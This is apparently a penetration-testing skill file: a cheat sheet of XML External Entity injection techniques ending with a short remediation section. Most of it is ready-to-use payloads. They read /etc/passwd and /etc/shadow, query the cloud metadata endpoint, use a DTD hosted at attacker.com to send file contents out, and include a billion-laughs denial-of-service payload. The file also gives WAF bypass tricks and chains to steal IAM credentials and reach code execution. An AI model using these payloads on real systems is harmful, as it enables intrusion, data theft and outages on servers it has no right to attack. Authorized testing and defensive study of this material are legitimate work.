---
name: xxe
description: XML External Entity injection for file read, SSRF, and denial of service
---

# XML External Entity (XXE)

## Attack Surface
- Any endpoint that parses XML input: SOAP APIs, file uploads (SVG, DOCX, XLSX), RSS/Atom feeds
- XML-based configuration importers and data exchange formats (SAML, XACML)
- Document processors that handle Office Open XML, SVG rendering engines, and PDF generators

## Detection Techniques
- Submit `<!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>` and check if "test" appears in the response
- Monitor DNS/HTTP callbacks using an out-of-band server (e.g., Burp Collaborator, interactsh)
- Fuzz Content-Type headers: switch `application/json` to `application/xml` and send XML payloads
- Inspect SOAP endpoints for DTD processing by injecting external entity references
- Check SVG upload handlers by embedding XXE in SVG files

## Common Payloads

```xml
<!-- Classic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>

<!-- Blind XXE via out-of-band (OOB) exfiltration -->
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]><foo>bar</foo>
<!-- evil.dtd: <!ENTITY % file SYSTEM "file:///etc/hostname">
              <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>"> -->

<!-- XXE in SVG -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

<!-- XXE in SOAP -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body><getData>&xxe;</getData></soapenv:Body></soapenv:Envelope>

<!-- XXE in DOCX (inject into [Content_Types].xml or word/document.xml) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Parameter entity for filter bypass -->
<!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY c '%a;'>">%b;]><foo>&c;</foo>

<!-- PHP stream wrapper for base64 exfil -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>

<!-- Billion laughs DoS -->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><foo>&lol3;</foo>
```

## Bypass Techniques
- Use UTF-16 or UTF-7 encoding to evade WAF pattern matching on `<!DOCTYPE` or `<!ENTITY`
- Embed XXE in nested document formats: SVG inside HTML, XML inside DOCX/XLSX zip archives
- Use parameter entities (`%entity;`) instead of general entities to bypass entity-name filters
- Leverage protocol handlers: `jar:`, `netdoc:`, `php://`, `gopher://` when `file://` is blocked
- Split the DTD across external files hosted on attacker infrastructure to evade inline detection

## Exploit Chaining
- XXE to SSRF: read cloud metadata (AWS/GCP/Azure) to steal IAM credentials, then pivot to cloud services
- XXE to RCE: on PHP (`expect://id`), or chain file read to extract SSH keys/database credentials for lateral movement
- XXE to DoS: billion laughs / recursive entity expansion to exhaust server memory

## Remediation
- Disable DTD processing and external entity resolution in all XML parsers (`XMLConstants.FEATURE_SECURE_PROCESSING`)
- Use `defusedxml` (Python), `FEATURE_DISALLOW_DTD` (Java), or equivalent safe parser configurations
- Validate and sanitize XML input; reject documents containing `<!DOCTYPE` declarations when not needed
- Prefer JSON over XML for APIs; if XML is required, use schema validation (XSD) without DTD support
